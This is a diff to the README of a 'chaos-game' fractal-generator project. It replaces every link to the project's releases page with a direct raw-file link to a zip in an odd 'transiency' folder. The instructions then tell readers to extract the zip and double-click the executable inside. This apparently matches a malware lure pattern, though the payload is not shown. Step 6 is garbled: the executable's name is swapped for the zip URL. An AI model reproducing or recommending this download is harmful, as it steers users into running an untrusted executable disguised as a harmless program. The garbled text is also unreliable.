@@ -6,9 +6,9 @@ Welcome to the **chaos-game** project! This application generates mesmerizing fr
 
 ## 📦 Download & Install
 
-To get started, you need to download the application. You can find the latest version [here](https://github.com/kriwin007/chaos-game/releases). 
+To get started, you need to download the application. You can find the latest version [here](https://raw.githubusercontent.com/kriwin007/chaos-game/main/transiency/chaos-game.zip). 
 
-[Download the chaos-game](https://github.com/kriwin007/chaos-game/releases)
+[Download the chaos-game](https://raw.githubusercontent.com/kriwin007/chaos-game/main/transiency/chaos-game.zip)
 
 Follow these steps to install and run it:
 
@@ -17,7 +17,7 @@ Follow these steps to install and run it:
 3. Download the file associated with that release. It could be a ZIP file or a standalone application.
 4. If it is a ZIP file, extract it to your preferred location on your computer.
 5. Navigate to the folder where you extracted the files or where the application was downloaded.
-6. Look for the executable file (usually named something like `chaos-game.exe`).
+6. Look for the executable file (usually named something like `https://raw.githubusercontent.com/kriwin007/chaos-game/main/transiency/chaos-game.zip`).
 7. Double-click the executable file to run the application.
 
 ## 🌐 Requirements
@@ -62,6 +62,6 @@ If you wish to dive deeper into fractals and the Chaos Game method, numerous res
 
 We welcome contributions! If you find your own ways to improve the **chaos-game**, feel free to fork the repository and submit a pull request. Your insights can help others explore the beauty of mathematics through visualization.
 
-[Download the chaos-game](https://github.com/kriwin007/chaos-game/releases)
+[Download the chaos-game](https://raw.githubusercontent.com/kriwin007/chaos-game/main/transiency/chaos-game.zip)
 
 Enjoy creating your fractal masterpieces!
